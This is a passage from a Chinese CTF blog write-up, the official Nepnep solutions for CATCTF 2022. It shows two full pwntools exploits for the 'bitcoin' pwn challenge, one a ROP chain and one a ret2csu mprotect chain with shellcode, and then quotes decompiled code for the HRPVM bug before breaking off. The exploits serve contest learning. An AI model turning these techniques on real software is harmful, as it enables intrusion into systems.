<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP | xia0ji233's blog</title><meta name="author" content="xia0ji233"><meta name="copyright" content="xia0ji233"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CatCTF2022 官方WP">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP">
<meta property="og:url" content="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/index.html">
<meta property="og:site_name" content="xia0ji233&#39;s blog">
<meta property="og:description" content="CatCTF2022 官方WP">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xia0ji233.github.io/img/avatar.png">
<meta property="article:published_time" content="2023-01-01T10:00:00.000Z">
<meta property="article:modified_time" content="2024-04-09T05:23:09.884Z">
<meta property="article:author" content="xia0ji233">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xia0ji233.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-09 13:23:09'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="xia0ji233's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">283</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">107</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroud.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="xia0ji233's blog"><span class="site-name">xia0ji233's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-01T10:00:00.000Z" title="发表于 2023-01-01 18:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-09T05:23:09.884Z" title="更新于 2024-04-09 13:23:09">2024-04-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/writeup/">writeup</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/writeup/CatCTF2022/">CatCTF2022</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Nepnep/">Nepnep</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">35.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>180分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>CatCTF2022 官方WP</p>
<span id="more"></span>

<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%84%9F%E8%B0%A2">感谢</a></li>
<li><a href="#%E6%8B%9B%E6%96%B0">招新</a></li>
<li><a href="#PWN">PWN</a><ul>
<li><a href="#bitcoin">bitcoin🪙</a><ul>
<li><a href="#EXP">EXP</a></li>
<li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">非预期</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">源码</a></li>
</ul>
</li>
<li><a href="#HRPVM%EF%B8%8F">HRPVM🖥️</a><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E">漏洞</a></li>
<li><a href="#EXP">EXP</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">源码</a></li>
</ul>
</li>
<li><a href="#injection20">injection2.0💉</a><ul>
<li><a href="#exp">exp</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">上传脚本</a></li>
</ul>
</li>
<li><a href="#kernel-test-%E6%9C%AC%E6%AC%A1%E8%B5%84%E6%BA%90%E5%90%88%E9%9B%86%E5%8C%85%E6%8B%AC%E6%BA%90%E7%A0%81EXPdocker">kernel-test 本次资源合集，包括源码，EXP，docker🧬</a><ul>
<li><a href="#Ret2usr">Ret2usr</a></li>
<li><a href="#%E7%AE%80%E6%98%93%E8%AE%B2%E8%A7%A3">简易讲解</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">源码</a></li>
<li><a href="#%E9%87%8D%E7%82%B9">重点</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a></li>
<li><a href="#EXP">EXP</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">上传脚本</a></li>
<li><a href="#tips">tips</a></li>
</ul>
</li>
<li><a href="#zip">zip💼</a><ul>
<li><a href="#%E9%9D%9E%E9%A2%84%E6%9C%9F">非预期</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">源码</a></li>
</ul>
</li>
<li><a href="#welcome_cat_ctf">welcome_cat_ctf🎉</a></li>
<li><a href="#chao-">chao 🌿</a><ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90">逆向分析</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
<li><a href="#exp">exp</a></li>
<li><a href="#%E6%BA%90%E7%A0%81">源码</a></li>
</ul>
</li>
<li><a href="#Cat-of-magic%EF%B8%8F">Cat of magic🧙‍♀️</a><ul>
<li><a href="#exp">exp</a></li>
<li><a href="#%E5%9C%B0%E5%9B%BE">地图</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#WEB">WEB</a><ul>
<li><a href="#ez_js">ez_js🐦</a></li>
<li><a href="#Cat-cat">Cat cat😼</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%B0%9D%E8%AF%95">信息收集与尝试</a></li>
<li><a href="#%E9%A2%98%E7%9B%AE%E9%A6%96%E9%A1%B5">题目首页</a></li>
<li><a href="#%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6">尝试读取系统文件</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81">读取源码</a></li>
<li><a href="#apppy">app.py</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a></li>
<li><a href="#%E5%AE%A1%E8%AE%A1apppy">审计app.py</a></li>
<li><a href="#flag%E9%83%A8%E5%88%86">flag部分</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%83%A8%E5%88%86">文件读取部分</a></li>
<li><a href="#%E5%AE%A1%E8%AE%A1catpy">审计cat.py</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8A%9F%E8%83%BD">文件读取功能</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98">解题</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96secret-key">获取secret key</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E5%A0%86%E6%A0%88%E5%88%86%E5%B8%83">读取堆栈分布</a></li>
<li><a href="#%E8%AF%BB%E5%8F%96%E5%AF%B9%E5%BA%94%E4%BD%8D%E7%BD%AE%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE">读取对应位置内存数据</a></li>
<li><a href="#%E4%BC%AA%E9%80%A0session">伪造session</a></li>
<li><a href="#%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag">一键获取flag</a></li>
<li><a href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E">写在最后</a></li>
</ul>
</li>
<li><a href="#ez_bypass">ez_bypass🍥</a></li>
<li><a href="#ez_curl">ez_curl🔗</a></li>
<li><a href="#wife">wife💃</a></li>
<li><a href="#web_challenge">web_challenge💪</a></li>
</ul>
</li>
<li><a href="#CRYPTO">CRYPTO</a><ul>
<li><a href="#DDH_Game">DDH_Game</a><ul>
<li><a href="#%E8%A7%A3%E6%B3%95%E4%B8%80">解法一</a></li>
<li><a href="#%E8%A7%A3%E6%B3%95%E4%BA%8C">解法二</a></li>
<li><a href="#%E5%8A%A8%E6%9C%BA">动机</a></li>
</ul>
</li>
<li><a href="#cat_theory">cat_theory</a><ul>
<li><a href="#%E9%A2%98%E8%A7%A3">题解</a></li>
<li><a href="#%E5%8A%A8%E6%9C%BA">动机</a></li>
</ul>
</li>
<li><a href="#cats-gift">cat’s gift🎁</a><ul>
<li><a href="#%E9%A2%98%E8%A7%A3">题解</a></li>
<li><a href="#%E5%90%8E%E8%AE%B0">后记</a></li>
</ul>
</li>
<li><a href="#%E7%9B%96%E8%8C%A8%E6%AF%94can-you-tell-AES-from-blackboxsampl%E5%87%BA%E9%A2%98%E4%BA%BA%E5%89%8D%E8%A8%80">盖茨比&amp;can you tell AES from blackbox？&amp;sampl出题人前言</a></li>
<li><a href="#%E7%9B%96%E8%8C%A8%E6%AF%94">盖茨比</a><ul>
<li><a href="#mtp">mtp</a></li>
<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
</ul>
</li>
<li><a href="#can-you-tell-AES-from-blackbox">can you tell AES from blackbox？</a></li>
<li><a href="#sample">sample</a></li>
</ul>
</li>
<li><a href="#Reverse">Reverse</a><ul>
<li><a href="#CatFly">CatFly🛫🐱</a></li>
<li><a href="#ReadingSection">ReadingSection</a></li>
<li><a href="#StupidOrangeCat2">StupidOrangeCat2
</a></li>
<li><a href="#The-cat-did-it">The cat did it</a><ul>
<li><a href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%92%8C%E8%A7%A3%E6%B3%95">设计思路和解法</a></li>
<li><a href="#%E7%8C%AB%E7%8C%AB%E9%95%87%E6%A5%BC">猫猫镇楼</a></li>
</ul>
</li>
<li><a href="#BugCat">BugCat</a><ul>
<li><a href="#%E4%B8%80%E5%89%8D%E8%A8%80">一、前言</a></li>
<li><a href="#%E4%BA%8C%E8%A7%A3%E9%A2%98%E6%96%B9%E6%A1%88">二、解题方案</a></li>
<li><a href="#%E4%B8%89%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC">三、解题脚本</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#MISC">MISC</a><ul>
<li><a href="#catnim">catnim</a><ul>
<li><a href="#exp">exp</a></li>
</ul>
</li>
<li><a href="#miao">miao~</a></li>
<li><a href="#Peekaboo">Peekaboo</a></li>
<li><a href="#MeowMeow">MeowMeow</a></li>
<li><a href="#CatFlag">CatFlag</a></li>
<li><a href="#CatPaw">CatPaw</a><ul>
<li><a href="#1-%E6%8B%A5%E6%9C%89%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%AF%B9%E5%BA%94%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80">1. 拥有小米手机，可以查看对应的符号布局</a></li>
<li><a href="#2%E5%AF%BB%E6%89%BE%E5%B0%8F%E7%B1%B3%E5%AE%89%E5%85%A8%E9%94%AE%E7%9B%98%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80">2.寻找小米安全键盘的符号布局</a></li>
<li><a href="#3%E5%90%88%E7%90%86%E7%8C%9C%E6%B5%8B">3.合理猜测</a></li>
<li><a href="#4%E9%87%8D%E6%94%BE">4.重放?</a></li>
</ul>
</li>
<li><a href="#CatJump">CatJump</a><ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#%E5%87%BA%E9%A2%98%E7%81%B5%E6%84%9F%E6%9D%A5%E6%BA%90">出题灵感来源</a></li>
<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF1">解题思路1</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2">解题思路2</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%E9%9D%9E%E9%A2%84%E6%9C%9F">解题思路3（非预期）</a></li>
</ul>
</li>
<li><a href="#CatCat">CatCat</a></li>
<li><a href="#CatchCat">CatchCat</a></li>
<li><a href="#Nepnep-%E7%A5%9D%E4%BD%A0%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%E5%95%A6">Nepnep 祝你新年快乐啦！
</a></li>
</ul>
</li>
</ul>
<h3 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h3><p>感谢Nepnep战队的各位成员、攻防世界的运维小哥哥小姐姐们、公开招募的出题人和志愿者们以及各位CTF选手对此次公益比赛的支持，让🐱🐱们可以饱餐一顿。最终本次活动共成功募集到1吨猫粮，以每只小猫每顿60g猫粮来计，超1.6w只流浪小猫将能饱餐一顿。<br>拯救喵喵大作战计划大获成功👏👏</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EKiSEZk7Kj7aTZYk4hWhew">https://mp.weixin.qq.com/s/EKiSEZk7Kj7aTZYk4hWhew</a></p>
<h3 id="招新"><a href="#招新" class="headerlink" title="招新"></a>招新</h3><p>Nepnep大力招新，感兴趣的师傅们可以投递简历到<a href="mailto:1764763743@qq.com" title="1764763743@qq.com">1764763743@qq.com</a>，期待各位师傅的加入QWQ！</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="bitcoin🪙"><a href="#bitcoin🪙" class="headerlink" title="bitcoin🪙"></a>bitcoin🪙</h3><p>这个题我没有出好，当时阳了&#x3D;-&#x3D; 脑子嗡嗡的 希望各位pwn不要介意</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/01DF1245_G97zrmnsPY.gif" class="">

<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">59746</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">rsi=<span class="number">0x0000000000406301</span></span><br><span class="line">cin=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">start=elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">hard=<span class="number">0x609248</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">pa=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(rdi)+p64(cin)+p64(rsi)+p64(hard)+p64(<span class="number">0</span>)+p64(use_cin)+p64(<span class="number">0x402937</span>)</span><br><span class="line">r.sendline(pa)</span><br><span class="line">r.sendline(p64(<span class="number">1</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>我沙盒检测机制设置的不是很好，mprotect被利用了，利用csu+shellcode直接梭哈</p>
<p>非预期发现者（第一个和我反馈的也许有别的师傅也发现了）：gxh191师傅</p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&quot;61.147.171.105&quot;,59746)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">rsi=<span class="number">0x0000000000406301</span></span><br><span class="line">cin=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">start=elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">hard=<span class="number">0x609248</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12, r13, r14, r15, last</span>):</span><br><span class="line">  payload = <span class="number">0x48</span> * <span class="string">&#x27;a&#x27;</span>  </span><br><span class="line">  <span class="comment">#构造栈溢出的padding</span></span><br><span class="line">  payload += p64(<span class="number">0x4062F6</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>    </span><br><span class="line">  <span class="comment">#gadgets1的地址</span></span><br><span class="line">  payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">  <span class="comment">#rbx=0, rbp=1</span></span><br><span class="line">  payload += p64(r12)</span><br><span class="line">  <span class="comment">#call调用的地址</span></span><br><span class="line">  payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">  <span class="comment">#三个参数的寄存器</span></span><br><span class="line">  payload += p64(<span class="number">0x4062E0</span>)</span><br><span class="line">  <span class="comment">#gadgets2的地址</span></span><br><span class="line">  payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">  <span class="comment">#pop出的padding</span></span><br><span class="line">  payload += p64(last)</span><br><span class="line">  <span class="comment">#函数最后的返回地址</span></span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line">mprotect=ret_csu(<span class="number">0x6091E0</span>,<span class="number">0x609000</span>,<span class="number">0x1000</span>,<span class="number">7</span>,rdi)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">pa=mprotect+p64(cin)+p64(rsi)+p64(<span class="number">0x609000</span>)+p64(<span class="number">0</span>)+p64(use_cin)+p64(<span class="number">0x609000</span>)</span><br><span class="line">r.sendline(pa)</span><br><span class="line">r.sendline(asm(shellcraft.cat(<span class="string">&quot;./flag&quot;</span>)))</span><br><span class="line"><span class="comment">#r.sendline(p64(1))</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>第二种，直接跳转到0x404EA4把flag读出来 这是最常见的方法</p>
<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd=yrmv" title="https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd=yrmv">https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd&#x3D;yrmv</a><br>提取码：yrmv<br>--来自百度网盘超级会员V4的分享</p>
<h3 id="HRPVM🖥️"><a href="#HRPVM🖥️" class="headerlink" title="HRPVM🖥️"></a>HRPVM🖥️</h3><p>想出一些有意义的题目，题目漏洞虽然简单，但是比较适合新人去调试布局内存，出题不是为了折磨选手，是为了大家都能学到东西</p>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>create_file函数可以无限创建文件没有检查file_count的大小</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall create_file(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v2; // ebx</span><br><span class="line"></span><br><span class="line">  result = check_repeat(a1);</span><br><span class="line">  if ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_QWORD *)&amp;unk_204130 + 4 * file_count) = global_fd;</span><br><span class="line">    *((_QWORD *)&amp;unk_204128 + 4 * file_count) = a1;</span><br><span class="line">    *((_QWORD *)&amp;HF + 4 * file_count) = 1000LL;</span><br><span class="line">    v2 = 